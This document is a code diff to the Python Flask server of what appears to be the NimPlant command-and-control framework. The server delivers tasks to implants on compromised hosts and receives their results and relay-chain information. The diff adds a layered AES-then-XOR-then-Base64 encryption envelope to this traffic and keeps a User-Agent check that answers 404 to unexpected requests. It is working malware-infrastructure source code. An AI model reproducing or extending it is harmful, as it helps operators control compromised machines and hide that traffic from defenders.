@@ -18,6 +18,7 @@ from flask_cors import CORS
 from src.config.config import config
 from src.util.crypto import (
     xor_string,
+    xor_bytes,
     decrypt_data,
     encrypt_data,
     decrypt_data_to_bytes,
@@ -350,7 +351,7 @@ def nim_implants_server(xor_key):
                 pending_tasks_count = len(np.pending_tasks) if np.pending_tasks else 0
                 utils.nimplant_print(f"DEBUG: Pending tasks after check-in: {pending_tasks_count}")
                 
-                # TASK DELIVERY
+                # TASK DELIVERY with ultra-simple double encryption support
                 if pending_tasks_count > 0:
                     utils.nimplant_print(f"DEBUG: Proceeding to deliver pending task")
                     
@@ -359,8 +360,27 @@ def nim_implants_server(xor_key):
                     utils.nimplant_print(f"DEBUG: Task to deliver: {next_task}")
                     
                     if next_task:
-                        task = encrypt_data(next_task, np.encryption_key)
-                        utils.nimplant_print(f"DEBUG: Encrypted task (length: {len(task)})")
+                        # Check if this implant is behind a relay server
+                        current_role = db.db_get_nimplant_relay_role(np.guid)
+                        is_relay_client = current_role == "RELAY_CLIENT"
+                        
+                        utils.nimplant_print(f"DEBUG: Implant role: {current_role}, is_relay_client: {is_relay_client}")
+                        
+                        # UNIFIED LAYERED ENCRYPTION: AES → XOR for ALL implants
+                        utils.nimplant_print(f"DEBUG: 🔐🔐 Using layered encryption for {current_role}")
+                        
+                        # Step 1: AES encrypt with client's UNIQUE_KEY (content layer)
+                        utils.nimplant_print(f"DEBUG: 🔐 Step 1: AES encrypt with UNIQUE_KEY (content)")
+                        step1_encrypted = encrypt_data(next_task, np.encryption_key)
+                        utils.nimplant_print(f"DEBUG: 🔐 Step 1 complete - AES content encrypted")
+                        
+                        # Step 2: XOR encrypt with INITIAL_XOR_KEY (transport/envelope layer)
+                        utils.nimplant_print(f"DEBUG: 🔐 Step 2: XOR encrypt with INITIAL_XOR_KEY (envelope)")
+                        step1_bytes = base64.b64decode(step1_encrypted)
+                        task_bytes = xor_bytes(step1_bytes, xor_key)
+                        task = base64.b64encode(task_bytes).decode('utf-8')
+                        utils.nimplant_print(f"DEBUG: 🔐 Layered encryption complete (length: {len(task)})")
+                        
                         return flask.jsonify(t=task), 200
                     else:
                         utils.nimplant_print(f"DEBUG: Error: get_next_task returned None despite having pending tasks")
@@ -738,7 +758,7 @@ def nim_implants_server(xor_key):
             return flask.jsonify(status="Not found"), 404
 
     @app.route(resultPath, methods=["POST"])
-    # Parse command output IF the user-agent is as expected
+    # Parse command output with ultra-simple double decryption support
     def get_result():
         client_ip = get_external_ip(flask.request)
         utils.nimplant_print(f"DEBUG: [ROUTE ACTIVATED] result_path: {flask.request.method} {resultPath} from {client_ip}")
@@ -771,11 +791,33 @@ def nim_implants_server(xor_key):
                         return flask.jsonify(status="Not found"), 404
                         
                     encrypted_data = data["data"]
-                    utils.nimplant_print(f"DEBUG: Encrypted data received (length: {len(encrypted_data) if encrypted_data else 0})")
+                    utils.nimplant_print(f"DEBUG: Encrypted result data received (length: {len(encrypted_data) if encrypted_data else 0})")
                     
-                    utils.nimplant_print(f"DEBUG: Decrypting data...")
-                    decrypted_data = decrypt_data(encrypted_data, np.encryption_key)
-                    utils.nimplant_print(f"DEBUG: Decrypted data: {decrypted_data}")
+                    # Check if this implant is behind a relay server (has relay role or parent_guid)
+                    current_role = db.db_get_nimplant_relay_role(np.guid)
+                    is_relay_client = current_role == "RELAY_CLIENT"
+                    
+                    utils.nimplant_print(f"DEBUG: Implant role: {current_role}, is_relay_client: {is_relay_client}")
+                    
+                    # UNIFIED LAYERED DECRYPTION: Base64 → XOR → AES for ALL implants
+                    utils.nimplant_print(f"DEBUG: 🔐🔐 Using layered decryption for {current_role}")
+                    
+                    # Step 1: Base64 decode to get XOR-encrypted bytes
+                    utils.nimplant_print(f"DEBUG: 🔓 Step 1: Base64 decode")
+                    step1_bytes = base64.b64decode(encrypted_data)
+                    utils.nimplant_print(f"DEBUG: 🔓 Step 1 complete - Base64 decoded")
+                    
+                    # Step 2: XOR decrypt with INITIAL_XOR_KEY (envelope layer)
+                    utils.nimplant_print(f"DEBUG: 🔓 Step 2: XOR decrypt with INITIAL_XOR_KEY (envelope)")
+                    step2_decrypted_bytes = xor_bytes(step1_bytes, xor_key)
+                    # Convert bytes back to string for AES decryption
+                    step2_decrypted = step2_decrypted_bytes.decode('utf-8')
+                    utils.nimplant_print(f"DEBUG: 🔓 Step 2 complete - XOR envelope removed")
+                    
+                    # Step 3: AES decrypt with client's UNIQUE_KEY (content layer)
+                    utils.nimplant_print(f"DEBUG: 🔓 Step 3: AES decrypt with UNIQUE_KEY (content)")
+                    decrypted_data = decrypt_data(step2_decrypted, np.encryption_key)
+                    utils.nimplant_print(f"DEBUG: 🔓 Layered decryption complete: {decrypted_data}")
                     
                     res = json.loads(decrypted_data)
                     utils.nimplant_print(f"DEBUG: Parsed JSON: {res}")
@@ -841,11 +883,11 @@ def nim_implants_server(xor_key):
             return flask.jsonify(status="Not found"), 404
 
     @app.route("/chain", methods=["POST"])
-    # Enhanced chain info receiver for distributed relay system
+    # Enhanced chain info receiver for distributed relay system with ultra-simple double decryption
     def receive_chain_info():
         client_ip = get_external_ip(flask.request)
         utils.nimplant_print(f"DEBUG: [ROUTE ACTIVATED] 📡 /chain endpoint from {client_ip}")
-        utils.nimplant_print(f"DEBUG: 📡 === RECEIVING CHAIN INFO ===")
+        utils.nimplant_print(f"DEBUG: 📡 === RECEIVING CHAIN INFO WITH ULTRA-SIMPLE DOUBLE DECRYPTION ===")
         utils.nimplant_print(f"DEBUG: 📡 Complete headers: {dict(flask.request.headers)}")
         
         if not flask.request.is_json:
@@ -874,14 +916,28 @@ def nim_implants_server(xor_key):
                         utils.nimplant_print(f"DEBUG: 📡 ❌ JSON does not contain 'data' field")
                         return flask.jsonify(status="Not found"), 404
                         
-                    encrypted_data = data["data"]
-                    utils.nimplant_print(f"DEBUG: 📡 🔐 Encrypted chain info received (length: {len(encrypted_data) if encrypted_data else 0})")
+                    double_encrypted_data = data["data"]
+                    utils.nimplant_print(f"DEBUG: 📡 🔐🔐 Double-encrypted chain info received (length: {len(double_encrypted_data) if double_encrypted_data else 0})")
                     
-                    utils.nimplant_print(f"DEBUG: 📡 🔓 Decrypting chain info data...")
-                    decrypted_data = decrypt_data(encrypted_data, np.encryption_key)
-                    utils.nimplant_print(f"DEBUG: 📡 🔓 Decrypted chain info: {decrypted_data}")
+                    # CORRECT LAYERED DECRYPTION: Base64 → XOR → AES
+                    # Step 1: Base64 decode to get XOR-encrypted bytes
+                    utils.nimplant_print(f"DEBUG: 📡 🔓 Step 1: Base64 decode")
+                    step1_bytes = base64.b64decode(double_encrypted_data)
+                    utils.nimplant_print(f"DEBUG: 📡 🔓 Step 1 complete - Base64 decoded")
                     
-                    chain_data = json.loads(decrypted_data)
+                    # Step 2: XOR decrypt with INITIAL_XOR_KEY (envelope layer)
+                    utils.nimplant_print(f"DEBUG: 📡 🔓 Step 2: XOR decrypt with INITIAL_XOR_KEY (envelope)")
+                    step2_decrypted_bytes = xor_bytes(step1_bytes, xor_key)
+                    # Convert bytes back to string for AES decryption
+                    step2_decrypted = step2_decrypted_bytes.decode('utf-8')
+                    utils.nimplant_print(f"DEBUG: 📡 🔓 Step 2 complete - XOR envelope removed")
+                    
+                    # Step 3: AES decrypt with client's UNIQUE_KEY (content layer)
+                    utils.nimplant_print(f"DEBUG: 📡 🔓 Step 3: AES decrypt with UNIQUE_KEY (content)")
+                    step3_decrypted = decrypt_data(step2_decrypted, np.encryption_key)
+                    utils.nimplant_print(f"DEBUG: 📡 🔓 Step 3 complete - Final decrypted chain info: {step3_decrypted}")
+                    
+                    chain_data = json.loads(step3_decrypted)
                     utils.nimplant_print(f"DEBUG: 📡 📝 Parsed chain info JSON: {chain_data}")
                     
                     # Validate chain info structure
@@ -952,19 +1008,19 @@ def nim_implants_server(xor_key):
                         db.db_update_nimplant(np)
                         utils.nimplant_print(f"DEBUG: 📡 ✅ Implant system info updated in database")
                         
-                        utils.nimplant_print(f"DEBUG: 📡 === END CHAIN INFO PROCESSING (SUCCESS) ===")
+                        utils.nimplant_print(f"DEBUG: 📡 === END ULTRA-SIMPLE DOUBLE DECRYPTION (SUCCESS) ===")
                         return flask.jsonify(status="OK"), 200
                     else:
                         utils.nimplant_print(f"DEBUG: 📡 ❌ Failed to store chain relationship")
-                        utils.nimplant_print(f"DEBUG: 📡 === END CHAIN INFO PROCESSING (DB ERROR) ===")
+                        utils.nimplant_print(f"DEBUG: 📡 === END ULTRA-SIMPLE DOUBLE DECRYPTION (DB ERROR) ===")
                         return flask.jsonify(status="Error"), 500
                         
                 except Exception as e:
-                    utils.nimplant_print(f"DEBUG: 📡 ❌ ERROR processing chain info: {str(e)}")
+                    utils.nimplant_print(f"DEBUG: 📡 ❌ ERROR processing double-encrypted chain info: {str(e)}")
                     utils.nimplant_print(f"DEBUG: 📡 ❌ Exception type: {type(e).__name__}")
                     import traceback
                     utils.nimplant_print(f"DEBUG: 📡 ❌ Traceback: {traceback.format_exc()}")
-                    utils.nimplant_print(f"DEBUG: 📡 === END CHAIN INFO PROCESSING (EXCEPTION) ===")
+                    utils.nimplant_print(f"DEBUG: 📡 === END ULTRA-SIMPLE DOUBLE DECRYPTION (FAILURE) ===")
                     return flask.jsonify(status="Not found"), 404
             else:
                 utils.nimplant_print(f"DEBUG: 📡 ❌ Incorrect User-Agent: '{agent_header}'")
@@ -973,11 +1029,9 @@ def nim_implants_server(xor_key):
                 )
                 return flask.jsonify(status="Not found"), 404
         else:
-            utils.nimplant_print(f"DEBUG: 📡 ❌ Implant with ID not found: {request_id}")
+            utils.nimplant_print(f"DEBUG: 📡 ❌ Implant with ID not found: '{request_id}'")
             notify_bad_request(flask.request, BadRequestReason.ID_NOT_FOUND)
             return flask.jsonify(status="Not found"), 404
-
-    # Topology endpoint removed - now using distributed chain relationships system
 
     @app.errorhandler(Exception)
     def all_exception_handler(error):
